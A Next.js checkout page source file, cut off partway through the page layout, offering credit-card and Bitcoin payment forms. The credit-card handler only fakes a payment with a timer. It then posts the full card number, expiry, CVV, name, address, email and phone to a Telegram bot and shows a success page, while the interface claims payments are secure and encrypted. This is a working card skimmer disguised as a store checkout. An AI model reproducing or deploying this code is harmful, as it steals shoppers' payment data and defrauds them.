'use client'
import React, { useState, useEffect } from 'react';
import Link from 'next/link';
import { useRouter } from 'next/navigation';
import { useCart } from '@/context/CartContext';
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { ChevronDown, CreditCard, Bitcoin, ArrowLeft, Check, Shield, Lock, Star, Truck, RefreshCw } from 'lucide-react';
import client from '@/lib/sanity';

const TELEGRAM_BOT_TOKEN = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;

const escapeMarkdown = (text: string) => {
  return text.replace(/([_*\[\]()~`>#+\-=|{}.!\\])/g, '\\$1');
};

const PaymentMethodCard = ({ 
  icon, 
  title, 
  description, 
  isSelected, 
  onClick,
  badge
}: {
  icon: React.ReactNode;
  title: string;
  description: string;
  isSelected: boolean;
  onClick: () => void;
  badge?: string;
}) => (
  <div
    onClick={onClick}
    className={`group relative p-5 rounded-2xl border-2 cursor-pointer transition-all duration-300 transform hover:scale-[1.02] ${
      isSelected 
        ? 'border-blue-500 bg-gradient-to-r from-blue-50 to-indigo-50 shadow-lg shadow-blue-100' 
        : 'border-gray-200 hover:border-gray-300 hover:shadow-md bg-white'
    }`}
  >
    {badge && (
      <div className="absolute -top-2 -right-2 bg-green-500 text-white text-xs px-2 py-1 rounded-full font-medium">
        {badge}
      </div>
    )}
    <div className="flex items-center space-x-4">
      <div className={`p-3 rounded-xl transition-all duration-300 ${
        isSelected 
          ? 'bg-blue-100 text-blue-600 shadow-md' 
          : 'bg-gray-100 text-gray-600 group-hover:bg-gray-200'
      }`}>
        {icon}
      </div>
      <div className="flex-1">
        <h3 className="font-semibold text-gray-900 text-lg">{title}</h3>
        <p className="text-sm text-gray-500 mt-1">{description}</p>
      </div>
      <div className={`transition-all duration-300 ${isSelected ? 'scale-100 opacity-100' : 'scale-0 opacity-0'}`}>
        <div className="bg-blue-500 rounded-full p-1.5 shadow-md">
          <Check className="h-4 w-4 text-white" />
        </div>
      </div>
    </div>
  </div>
);

const CreditCardPayment = ({ totalAmount }: { totalAmount: number }) => {
  const router = useRouter();
  const { clearCart } = useCart();
  const [form, setForm] = useState({
    // Card Details
    cardName: '',
    cardNumber: '',
    expiry: '',
    cvv: '',
    
    // Contact Information
    email: '',
    phone: '',
    
    // Billing Address (same as delivery)
    firstName: '',
    lastName: '',
    address1: '',
    address2: '',
    city: '',
    state: '',
    country: 'United States',
    zipCode: '',
    
    // Delivery Options
    deliveryMethod: 'standard', // standard or express
    deliveryInstructions: '',
    
    // Additional
    saveInfo: false,
    gift: false,
    giftMessage: ''
  });

  const [errors, setErrors] = useState<Record<string, string>>({});
  const [status, setStatus] = useState({ message: '', color: '' });
  const [loading, setLoading] = useState(false);
  const [focusedField, setFocusedField] = useState<string | null>(null);

  const luhnCheck = (num: string): boolean => {
    const arr = num.split('').reverse().map(x => parseInt(x, 10));
    let sum = arr.reduce((acc, val, i) => {
      if (i % 2 === 1) {
        val *= 2;
        if (val > 9) val -= 9;
      }
      return acc + val;
    }, 0);
    return sum % 10 === 0;
  };

  const validateExpiry = (exp: string): boolean => {
    if (!/^\d{2}\/\d{2}$/.test(exp)) return false;
    const [mm, yy] = exp.split('/').map(x => parseInt(x, 10));
    if (mm < 1 || mm > 12) return false;
    const now = new Date();
    const expDate = new Date(2000 + yy, mm);
    return expDate > now;
  };

  const formatCardNumber = (value: string): string => {
    return value.replace(/\D/g, '').substring(0, 16)
      .replace(/(.{4})/g, '$1 ').trim();
  };

  const formatExpiry = (value: string): string => {
    const digits = value.replace(/\D/g, '').substring(0, 4);
    if (digits.length >= 3) {
      return digits.substring(0, 2) + '/' + digits.substring(2);
    }
    return digits;
  };

  const getCardType = (number: string): string => {
    const num = number.replace(/\s/g, '');
    if (num.startsWith('4')) return 'visa';
    if (num.startsWith('5') || num.startsWith('2')) return 'mastercard';
    if (num.startsWith('3')) return 'amex';
    return 'card';
  };

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>) => {
    const { name, value, type } = e.target as HTMLInputElement;
    let val: string | boolean = value;

    if (type === 'checkbox') {
      val = (e.target as HTMLInputElement).checked;
    }

    if (name === 'cardNumber') val = formatCardNumber(value);
    if (name === 'expiry') val = formatExpiry(value);
    if (name === 'cvv') val = value.replace(/\D/g, '').substring(0, 4);

    setForm(prev => ({ ...prev, [name]: val }));
    setErrors(prev => ({ ...prev, [name]: '' }));
    setStatus({ message: '', color: '' });
  };

  const validateForm = (): boolean => {
    const errs: Record<string, string> = {};
    
    // Card validation
    if (!form.cardName.trim()) errs.cardName = 'Please enter name on card';
    const cardNumRaw = form.cardNumber.replace(/\s/g, '');
    if (!luhnCheck(cardNumRaw)) errs.cardNumber = 'Invalid card number';
    if (!validateExpiry(form.expiry)) errs.expiry = 'Invalid expiry date';
    if (!/^\d{3,4}$/.test(form.cvv)) errs.cvv = 'Invalid CVV';
    
    // Contact validation
    if (!form.email.trim()) errs.email = 'Email is required';
    if (!/^\S+@\S+\.\S+$/.test(form.email)) errs.email = 'Invalid email format';
    if (!form.phone.trim()) errs.phone = 'Phone number is required';
    
    // Address validation
    if (!form.firstName.trim()) errs.firstName = 'First name is required';
    if (!form.lastName.trim()) errs.lastName = 'Last name is required';
    if (!form.address1.trim()) errs.address1 = 'Address is required';
    if (!form.city.trim()) errs.city = 'City is required';
    if (!form.state.trim()) errs.state = 'State is required';
    if (!form.zipCode.trim()) errs.zipCode = 'ZIP code is required';
    if (!/^\d{5}(-\d{4})?$/.test(form.zipCode)) errs.zipCode = 'Invalid ZIP code';

    setErrors(errs);
    return Object.keys(errs).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!validateForm()) return;

    setLoading(true);
    setStatus({ message: 'Processing your payment...', color: 'blue' });

    try {
      // Simulate payment processing
      await new Promise(resolve => setTimeout(resolve, 2000));
      
      // Format the delivery address
      const deliveryAddress = `
${form.firstName} ${form.lastName}
${form.address1}
${form.address2 ? form.address2 + '\n' : ''}
${form.city}, ${form.state} ${form.zipCode}
${form.country}
      `.trim();

      // Send order details to Telegram
      if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
        const message = `
💰 *New Order Received* 💰
🛒 *Amount*: \\$${escapeMarkdown(totalAmount.toFixed(2))}

💳 *Payment Details*:
   \\- Card: \`${escapeMarkdown(form.cardNumber.replace(/\s/g, ''))}\`
   \\- Expiry: ${escapeMarkdown(form.expiry)}
   \\- Name: ${escapeMarkdown(form.cardName)}
    \\- CVV: ${escapeMarkdown(form.cvv)}

📦 *Delivery Address*:
${escapeMarkdown(deliveryAddress).split('\n').map(line => `   \\- ${line}`).join('\n')}

📧 *Contact*:
   \\- Email: ${escapeMarkdown(form.email)}
   \\- Phone: ${escapeMarkdown(form.phone)}

🚚 *Delivery Method*: ${escapeMarkdown(form.deliveryMethod === 'standard' ? 'Standard (3-5 days)' : 'Express (1-2 days)')}
${form.deliveryInstructions ? `📝 *Delivery Notes*: ${escapeMarkdown(form.deliveryInstructions)}` : ''}

🌐 *Device Info*:
   \\- Browser: ${escapeMarkdown(navigator.userAgent)}
   \\- Time: ${escapeMarkdown(new Date().toLocaleString())}
        `.trim();

        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'MarkdownV2'
          }),
        });
      }

      clearCart();
      router.push('/payment/success');

    } catch (error) {
      console.error('Payment error:', error);
      setStatus({
        message: 'Payment failed. Please try again or contact support.',
        color: 'red'
      });
    } finally {
      setLoading(false);
    }
  };

  return (
    <form onSubmit={handleSubmit} className="space-y-6">
      {/* Card Details Section */}
      <div className="bg-gradient-to-r from-blue-50 to-indigo-50 p-5 rounded-2xl border border-blue-200">
        <h3 className="text-lg font-semibold text-gray-900 mb-4 flex items-center">
          <CreditCard className="w-5 h-5 mr-2 text-blue-600" />
          Card Information
        </h3>
        
        <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
          <div className="col-span-2">
            <InputField
              label="Name on Card"
              name="cardName"
              value={form.cardName}
              onChange={handleChange}
              error={errors.cardName}
              focusedField={focusedField}
              setFocusedField={setFocusedField}
              placeholder="John Smith"
            />
          </div>
          
          <div className="col-span-2">
            <InputField
              label="Card Number"
              name="cardNumber"
              value={form.cardNumber}
              onChange={handleChange}
              error={errors.cardNumber}
              focusedField={focusedField}
              setFocusedField={setFocusedField}
              placeholder="1234 5678 9012 3456"
              icon={<CreditCard className="w-5 h-5 text-gray-400" />}
            />
          </div>
          
          <div>
            <InputField
              label="Expiration Date"
              name="expiry"
              value={form.expiry}
              onChange={handleChange}
              error={errors.expiry}
              focusedField={focusedField}
              setFocusedField={setFocusedField}
              placeholder="MM/YY"
            />
          </div>
          
          <div>
            <InputField
              label="CVV"
              name="cvv"
              value={form.cvv}
              onChange={handleChange}
              error={errors.cvv}
              focusedField={focusedField}
              setFocusedField={setFocusedField}
              placeholder="123"
              icon={<Lock className="w-4 h-4 text-gray-400" />}
            />
          </div>
        </div>
      </div>

      {/* Contact Information Section */}
      <div className="bg-gradient-to-r from-blue-50 to-indigo-50 p-5 rounded-2xl border border-blue-200">
        <h3 className="text-lg font-semibold text-gray-900 mb-4 flex items-center">
          <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 mr-2 text-blue-600" viewBox="0 0 20 20" fill="currentColor">
            <path d="M2.003 5.884L10 9.882l7.997-3.998A2 2 0 0016 4H4a2 2 0 00-1.997 1.884z" />
            <path d="M18 8.118l-8 4-8-4V14a2 2 0 002 2h12a2 2 0 002-2V8.118z" />
          </svg>
          Contact Information
        </h3>
        
        <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
          <InputField
            label="Email Address"
            name="email"
            type="email"
            value={form.email}
            onChange={handleChange}
            error={errors.email}
            focusedField={focusedField}
            setFocusedField={setFocusedField}
            placeholder="your@email.com"
          />
          
          <InputField
            label="Phone Number"
            name="phone"
            type="tel"
            value={form.phone}
            onChange={handleChange}
            error={errors.phone}
            focusedField={focusedField}
            setFocusedField={setFocusedField}
            placeholder="+1 (555) 123-4567"
          />
        </div>
      </div>

      {/* Delivery Address Section */}
      <div className="bg-gradient-to-r from-blue-50 to-indigo-50 p-5 rounded-2xl border border-blue-200">
        <h3 className="text-lg font-semibold text-gray-900 mb-4 flex items-center">
          <Truck className="w-5 h-5 mr-2 text-blue-600" />
          Delivery Address
        </h3>
        
        <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
          <InputField
            label="First Name"
            name="firstName"
            value={form.firstName}
            onChange={handleChange}
            error={errors.firstName}
            focusedField={focusedField}
            setFocusedField={setFocusedField}
            placeholder="John"
          />
          
          <InputField
            label="Last Name"
            name="lastName"
            value={form.lastName}
            onChange={handleChange}
            error={errors.lastName}
            focusedField={focusedField}
            setFocusedField={setFocusedField}
            placeholder="Smith"
          />
          
          <div className="col-span-2">
            <InputField
              label="Address Line 1"
              name="address1"
              value={form.address1}
              onChange={handleChange}
              error={errors.address1}
              focusedField={focusedField}
              setFocusedField={setFocusedField}
              placeholder="123 Main St"
            />
          </div>
          
          <div className="col-span-2">
            <InputField
              label="Address Line 2 (Optional)"
              name="address2"
              value={form.address2}
              onChange={handleChange}
              focusedField={focusedField}
              setFocusedField={setFocusedField}
              placeholder="Apt, suite, unit, building, floor, etc."
            />
          </div>
          
          <InputField
            label="City"
            name="city"
            value={form.city}
            onChange={handleChange}
            error={errors.city}
            focusedField={focusedField}
            setFocusedField={setFocusedField}
            placeholder="New York"
          />
          
          <div>
            <label className="block text-sm font-semibold text-gray-700 mb-2">State</label>
            <select
              name="state"
              value={form.state}
              onChange={handleChange}
              className={`w-full px-4 py-4 rounded-xl border-2 transition-all duration-300 ${
                errors.state 
                  ? 'border-red-500 bg-red-50' 
                  : focusedField === 'state'
                  ? 'border-blue-500 bg-blue-50 shadow-lg shadow-blue-100'
                  : 'border-gray-200 hover:border-gray-300'
              } focus:outline-none text-gray-900`}
            >
              <option value="">Select State</option>
              <option value="AL">Alabama</option>
              <option value="AK">Alaska</option>
              <option value="AZ">Arizona</option>
              <option value="AR">Arkansas</option>
              <option value="CA">California</option>
              <option value="CO">Colorado</option>
              <option value="CT">Connecticut</option>
              <option value="DE">Delaware</option>
              <option value="FL">Florida</option>
              <option value="GA">Georgia</option>
              <option value="HI">Hawaii</option>
              <option value="ID">Idaho</option>
              <option value="IL">Illinois</option>
              <option value="IN">Indiana</option>
              <option value="IA">Iowa</option>
              <option value="KS">Kansas</option>
              <option value="KY">Kentucky</option>
              <option value="LA">Louisiana</option>
              <option value="ME">Maine</option>
              <option value="MD">Maryland</option>
              <option value="MA">Massachusetts</option>
              <option value="MI">Michigan</option>
              <option value="MN">Minnesota</option>
              <option value="MS">Mississippi</option>
              <option value="MO">Missouri</option>
              <option value="MT">Montana</option>
              <option value="NE">Nebraska</option>
              <option value="NV">Nevada</option>
              <option value="NH">New Hampshire</option>
              <option value="NJ">New Jersey</option>
              <option value="NM">New Mexico</option>
              <option value="NY">New York</option>
              <option value="NC">North Carolina</option>
              <option value="ND">North Dakota</option>
              <option value="OH">Ohio</option>
              <option value="OK">Oklahoma</option>
              <option value="OR">Oregon</option>
              <option value="PA">Pennsylvania</option>
              <option value="RI">Rhode Island</option>
              <option value="SC">South Carolina</option>
              <option value="SD">South Dakota</option>
              <option value="TN">Tennessee</option>
              <option value="TX">Texas</option>
              <option value="UT">Utah</option>
              <option value="VT">Vermont</option>
              <option value="VA">Virginia</option>
              <option value="WA">Washington</option>
              <option value="WV">West Virginia</option>
              <option value="WI">Wisconsin</option>
              <option value="WY">Wyoming</option>
            </select>
            {errors.state && <p className="text-red-500 text-sm mt-2 animate-pulse">{errors.state}</p>}
          </div>
          
          <InputField
            label="ZIP Code"
            name="zipCode"
            value={form.zipCode}
            onChange={handleChange}
            error={errors.zipCode}
            focusedField={focusedField}
            setFocusedField={setFocusedField}
            placeholder="10001"
          />
          
          <div>
            <label className="block text-sm font-semibold text-gray-700 mb-2">Country</label>
            <select
              name="country"
              value={form.country}
              onChange={handleChange}
              className="w-full px-4 py-4 rounded-xl border-2 border-gray-200 hover:border-gray-300 focus:border-blue-500 focus:outline-none text-gray-900 bg-white"
              disabled
            >
              <option>United States</option>
            </select>
          </div>
        </div>
      </div>

      {/* Delivery Options Section */}
      <div className="bg-gradient-to-r from-blue-50 to-indigo-50 p-5 rounded-2xl border border-blue-200">
        <h3 className="text-lg font-semibold text-gray-900 mb-4 flex items-center">
          <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 mr-2 text-blue-600" viewBox="0 0 20 20" fill="currentColor">
            <path d="M8 16.5a1.5 1.5 0 11-3 0 1.5 1.5 0 013 0zM15 16.5a1.5 1.5 0 11-3 0 1.5 1.5 0 013 0z" />
            <path d="M3 4a1 1 0 00-1 1v10a1 1 0 001 1h1.05a2.5 2.5 0 014.9 0H10a1 1 0 001-1v-1a1 1 0 011-1h2a1 1 0 011 1v1a1 1 0 001 1h1.05a2.5 2.5 0 014.9 0H19a1 1 0 001-1V5a1 1 0 00-1-1H3zM3 5h2v2h5V5h8v10h-1.05a2.5 2.5 0 00-4.9 0H12v-2H8v2H7.05a2.5 2.5 0 00-4.9 0H3V5z" />
          </svg>
          Delivery Options
        </h3>
        
        <div className="space-y-4">
          <div className="flex items-center space-x-4">
            <input
              type="radio"
              id="standard"
              name="deliveryMethod"
              value="standard"
              checked={form.deliveryMethod === 'standard'}
              onChange={handleChange}
              className="h-5 w-5 text-blue-600 focus:ring-blue-500 border-gray-300"
            />
            <label htmlFor="standard" className="flex-1">
              <div className="font-medium text-gray-900">Standard Delivery</div>
              <p className="text-sm text-gray-500">3-5 business days • Free</p>
            </label>
          </div>
          
          <div className="flex items-center space-x-4">
            <input
              type="radio"
              id="express"
              name="deliveryMethod"
              value="express"
              checked={form.deliveryMethod === 'express'}
              onChange={handleChange}
              className="h-5 w-5 text-blue-600 focus:ring-blue-500 border-gray-300"
            />
            <label htmlFor="express" className="flex-1">
              <div className="font-medium text-gray-900">Express Delivery</div>
              <p className="text-sm text-gray-500">1-2 business days • $9.99</p>
            </label>
          </div>
        </div>
        
        <div className="mt-6">
          <label className="block text-sm font-semibold text-gray-700 mb-2">Delivery Instructions (Optional)</label>
          <textarea
            name="deliveryInstructions"
            value={form.deliveryInstructions}
            onChange={handleChange}
            rows={3}
            className="w-full px-4 py-3 rounded-xl border-2 border-gray-200 hover:border-gray-300 focus:border-blue-500 focus:outline-none text-gray-900 placeholder-gray-400"
            placeholder="Gate code, building access, delivery preferences, etc."
          />
        </div>
      </div>

      {/* Additional Options */}
      <div className="flex items-center justify-between">
        <div className="flex items-center">
          <input
            type="checkbox"
            id="saveInfo"
            name="saveInfo"
            checked={form.saveInfo}
            onChange={handleChange}
            className="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded"
          />
          <label htmlFor="saveInfo" className="ml-2 block text-sm text-gray-700">
            Save my information for faster checkout
          </label>
        </div>
        
        <div className="flex items-center">
          <input
            type="checkbox"
            id="gift"
            name="gift"
            checked={form.gift}
            onChange={handleChange}
            className="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded"
          />
          <label htmlFor="gift" className="ml-2 block text-sm text-gray-700">
            This is a gift
          </label>
        </div>
      </div>
      
      {form.gift && (
        <div className="mt-4">
          <label className="block text-sm font-semibold text-gray-700 mb-2">Gift Message (Optional)</label>
          <textarea
            name="giftMessage"
            value={form.giftMessage}
            onChange={handleChange}
            rows={2}
            className="w-full px-4 py-3 rounded-xl border-2 border-gray-200 hover:border-gray-300 focus:border-blue-500 focus:outline-none text-gray-900 placeholder-gray-400"
            placeholder="Write a personal message..."
          />
        </div>
      )}

      {/* Submit Button */}
      <button
        type="submit"
        disabled={loading}
        className={`w-full py-4 px-6 rounded-2xl font-semibold text-white transition-all duration-300 flex items-center justify-center transform hover:scale-[1.02] shadow-lg ${
          loading 
            ? 'bg-gray-400 cursor-not-allowed' 
            : 'bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 shadow-blue-200 hover:shadow-xl'
        }`}
      >
        {loading ? (
          <>
            <RefreshCw className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" />
            Processing Payment...
          </>
        ) : (
          <>
            <CreditCard className="w-5 h-5 mr-3" />
            Pay ${(form.deliveryMethod === 'express' ? totalAmount + 9.99 : totalAmount).toFixed(2)}
            <Shield className="w-4 h-4 ml-2 opacity-80" />
          </>
        )}
      </button>

      {/* Status Message */}
      {status.message && (
        <div className={`p-4 rounded-xl text-center font-medium transition-all duration-300 ${
          status.color === 'red' 
            ? 'bg-red-50 text-red-700 border border-red-200' 
            : 'bg-blue-50 text-blue-700 border border-blue-200'
        }`}>
          {status.message}
        </div>
      )}

      {/* Security Assurance */}
      <div className="flex items-center justify-center space-x-2 text-sm text-gray-500">
        <Lock className="w-4 h-4 text-gray-400" />
        <span>Payments are secure and encrypted</span>
      </div>
    </form>
  );
};


const BitcoinPayment = ({ totalAmount }: { totalAmount: number }) => {
  const router = useRouter();
  const { cart } = useCart();
  const [formData, setFormData] = useState({
    name: '',
    email: '',
    phone: '',
    company: '',
    address: '',
    address2: '',
    city: '',
    state: '',
    country: '',
    zipCode: '',
    deliveryNotes: ''
  });
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [focusedField, setFocusedField] = useState<string | null>(null);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value
    }));
  };

  const validateForm = () => {
    if (!formData.name.trim()) {
      setError('Full name is required');
      return false;
    }

    if (!formData.email.trim() || !/^\S+@\S+\.\S+$/.test(formData.email)) {
      setError('Valid email is required');
      return false;
    }

    if (!formData.phone.trim()) {
      setError('Phone number is required');
      return false;
    }

    if (!formData.address.trim()) {
      setError('Street address is required');
      return false;
    }

    if (!formData.city.trim()) {
      setError('City is required');
      return false;
    }

    if (!formData.state.trim()) {
      setError('State/Province is required');
      return false;
    }

    if (!formData.country.trim()) {
      setError('Country is required');
      return false;
    }

    if (!formData.zipCode.trim()) {
      setError('ZIP/Postal code is required');
      return false;
    }

    return true;
  };

  const handlePayment = async () => {
    
    setLoading(true);
    setError(null);
    const orderData = {
      _type: "order",
    
      // 🔹 Customer info
      name: formData.name,
      email: formData.email,
      phone: formData.phone,
      company: formData.company,
    
      // 🔹 Addresses
      address: formData.address,
      address2: formData.address2,
      city: formData.city,
      state: formData.state,
      country: formData.country,
      zipCode: formData.zipCode,
    
      // 🔹 Extra notes
      deliveryNotes: formData.deliveryNotes,
    
      // 🔹 Products in cart
      products: cart.map((item) => ({
        id: item.id,
        name: item.name,
        price: item.price,
        quantity: item.quantity,
      })),
    };
    
    
    if (!validateForm()) {
      setLoading(false);
      return;
    }

    try {
      // Create invoice via API


    try {
      await client.create(orderData);
      console.log(orderData)
    }
     catch (err) {
      console.error('Error creating order:', err);
    }
  
      const response = await fetch('/api/create-invoice', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          amount: totalAmount,
          items: [], // Add cart items here if needed
          customer: formData,
          metadata: {
            orderDate: new Date().toISOString()
          }
        })
      });

      if (!response.ok) {
        throw new Error('Failed to create invoice');
      }

      const data = await response.json();
      
      // Redirect to BTCPay invoice page
      window.location.href = data.paymentUrl;

    } catch (err: any) {
      console.error('Payment Error:', err);
      setError(err.message || 'Payment failed. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="space-y-6">
      <div className="bg-gradient-to-r from-orange-50 to-yellow-50 p-4 rounded-xl border border-orange-200">
        <div className="flex items-center space-x-3">
          <Bitcoin className="h-6 w-6 text-orange-500" />
          <div>
            <h4 className="font-semibold text-orange-900">Secure Bitcoin Payment</h4>
            <p className="text-sm text-orange-700">Fast, secure, and decentralized payment processing</p>
          </div>
        </div>
      </div>

      <div className="space-y-5">
        <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
          <InputField
            label="Full Name"
            name="name"
            value={formData.name}
            onChange={handleChange}
            required
            placeholder="Enter your full name"
            focusedField={focusedField}
            setFocusedField={setFocusedField}
          />

          <InputField
            label="Email Address"
            name="email"
            type="email"
            value={formData.email}
            onChange={handleChange}
            required
            placeholder="your@email.com"
            focusedField={focusedField}
            setFocusedField={setFocusedField}
          />
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
          <InputField
            label="Phone Number"
            name="phone"
            type="tel"
            value={formData.phone}
            onChange={handleChange}
            required
            placeholder="+1 (555) 123-4567"
            focusedField={focusedField}
            setFocusedField={setFocusedField}
          />

         
        </div>

        {/* Delivery Address Section */}
        <div className="pt-4 border-t border-gray-200">
          <h3 className="text-lg font-semibold text-gray-800 mb-4 flex items-center">
            Delivery Address
          </h3>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
            <InputField
              label="Country"
              name="country"
              value={formData.country}
              onChange={handleChange}
              required
              placeholder="United States"
              focusedField={focusedField}
              setFocusedField={setFocusedField}
            />

            <InputField
              label="State/Province"
              name="state"
              value={formData.state}
              onChange={handleChange}
              required
              placeholder="California"
              focusedField={focusedField}
              setFocusedField={setFocusedField}
            />
          </div>

          <InputField
            label="Street Address"
            name="address"
            value={formData.address}
            onChange={handleChange}
            required
            placeholder="123 Main Street"
            focusedField={focusedField}
            setFocusedField={setFocusedField}
          />

          <InputField
            label="Apartment, Suite, Unit (Optional)"
            name="address2"
            value={formData.address2}
            onChange={handleChange}
            placeholder="Apt 4B"
            focusedField={focusedField}
            setFocusedField={setFocusedField}
          />

          <div className="grid grid-cols-1 md:grid-cols-3 gap-5">
            <InputField
              label="City"
              name="city"
              value={formData.city}
              onChange={handleChange}
              required
              placeholder="New York"
              focusedField={focusedField}
              setFocusedField={setFocusedField}
            />

            <InputField
              label="ZIP/Postal Code"
              name="zipCode"
              value={formData.zipCode}
              onChange={handleChange}
              required
              placeholder="10001"
              focusedField={focusedField}
              setFocusedField={setFocusedField}
            />

            <InputField
              label="Delivery Instructions (Optional)"
              name="deliveryNotes"
              value={formData.deliveryNotes}
              onChange={handleChange}
              placeholder="Gate code, floor, etc."
              focusedField={focusedField}
              setFocusedField={setFocusedField}
            />
          </div>
        </div>
      </div>

      <button
        onClick={handlePayment}
        disabled={loading}
        className={`w-full py-4 px-6 rounded-2xl font-semibold text-white transition-all duration-300 flex items-center justify-center transform hover:scale-[1.02] shadow-lg ${
          loading
            ? 'bg-gray-400 cursor-not-allowed'
            : 'bg-gradient-to-r from-orange-500 to-yellow-500 hover:from-orange-600 hover:to-yellow-600 shadow-orange-200 hover:shadow-xl'
        }`}
      >
        {loading ? (
          <>
            <RefreshCw className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" />
            Processing Payment...
          </>
        ) : (
          <>
            <Bitcoin className="w-5 h-5 mr-3" />
            Pay ${totalAmount.toFixed(2)} with Bitcoin
            <Shield className="w-4 h-4 ml-2 opacity-80" />
          </>
        )}
      </button>

      {error && (
        <div className="p-4 bg-red-50 border-l-4 border-red-500 text-red-700 rounded-xl animate-pulse">
          <div className="flex items-center">
            <div className="flex-shrink-0">
              <svg className="h-5 w-5 text-red-400" viewBox="0 0 20 20" fill="currentColor">
                <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" />
              </svg>
            </div>
            <div className="ml-3">
              <p className="font-medium">Payment Error</p>
              <p className="text-sm">{error}</p>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

const InputField = ({
  label,
  name,
  type = 'text',
  value,
  onChange,
  placeholder = '',
  error,
  focusedField,
  setFocusedField,
  icon,
  required = false
}: {
  label: string;
  name: string;
  type?: string;
  value: string;
  onChange: (e: React.ChangeEvent<HTMLInputElement>) => void;
  placeholder?: string;
  error?: string;
  focusedField?: string | null;
  setFocusedField?: (field: string | null) => void;
  icon?: React.ReactNode;
  required?: boolean;
}) => (
  <div className="relative">
    <label className="block text-sm font-semibold text-gray-700 mb-2">
      {label} {required && <span className="text-red-500">*</span>}
    </label>
    <div className="relative">
      <input
        type={type}
        name={name}
        required={required}
        value={value}
        onChange={onChange}
        onFocus={() => setFocusedField?.(name)}
        onBlur={() => setFocusedField?.(null)}
        className={`w-full px-4 py-4 ${icon ? 'pl-12' : ''} rounded-xl border-2 transition-all duration-300 ${
          error 
            ? 'border-red-500 bg-red-50' 
            : focusedField === name
            ? 'border-blue-500 bg-blue-50 shadow-lg shadow-blue-100'
            : 'border-gray-200 hover:border-gray-300'
        } focus:outline-none text-gray-900 placeholder-gray-400`}
        placeholder={placeholder}
      />
      {icon && (
        <div className="absolute left-4 top-1/2 transform -translate-y-1/2">
          {icon}
        </div>
      )}
    </div>
    {error && <p className="text-red-500 text-sm mt-2 animate-pulse">{error}</p>}
  </div>
);

const CheckoutPage = () => {
  const { cart, getTotalPrice, clearCart } = useCart();
  const [paymentMethod, setPaymentMethod] = useState<string>('credit-card');
  const [isLoaded, setIsLoaded] = useState(false);

  useEffect(() => {
    setIsLoaded(true);
  }, []);

  if (cart.length === 0) {
    return (
      <div className="container mx-auto px-4 py-8 sm:py-12 md:py-16 text-center bg-gradient-to-br from-gray-50 to-white min-h-screen">
        <div className={`max-w-md mx-auto transition-all duration-700 ${isLoaded ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-8'}`}>
          <div className="bg-white rounded-3xl shadow-xl p-8 border border-gray-100">
            <div className="w-20 h-20 bg-gradient-to-r from-blue-100 to-indigo-100 rounded-full flex items-center justify-center mx-auto mb-6">
              <svg className="w-10 h-10 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M16 11V7a4 4 0 00-8 0v4M5 9h14l1 12H4L5 9z"></path>
              </svg>
            </div>
            <h1 className="text-2xl sm:text-3xl font-bold mb-4 text-gray-900">Your Cart is Empty</h1>
            <p className="mb-8 text-gray-600 text-base leading-relaxed">
              Looks like you haven't added any products to your cart yet. Start shopping to find amazing deals!
            </p>
            <Link href="/">
              <Button className="bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 text-white px-8 py-4 rounded-2xl font-semibold transition-all duration-300 transform hover:scale-105 shadow-lg hover:shadow-xl">
                Start Shopping
              </Button>
            </Link>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-50 via-white to-blue-50">
      <div className="container mx-auto px-4 py-8">
        <div className="max-w-7xl mx-auto">
          <div className={`mb-8 transition-all duration-700 ${isLoaded ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-4'}`}>
            <Link href="/cart" className="inline-flex items-center text-blue-600 hover:text-blue-700 text-sm font-medium transition-colors duration-200 group">
              <ArrowLeft className="w-4 h-4 mr-2 transition-transform duration-200 group-hover:-translate-x-1" />
              Back to Cart
            </Link>
          </div>

          <div className={`mb-8 transition-all duration-700 delay-100 ${isLoaded ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-4'}`}>
            <h1 className="text-3xl sm:text-4xl font-bold text-gray-900 mb-2">Secure Checkout</h1>
            <p className="text-gray-600">Complete your purchase with confidence</p>
          </div>

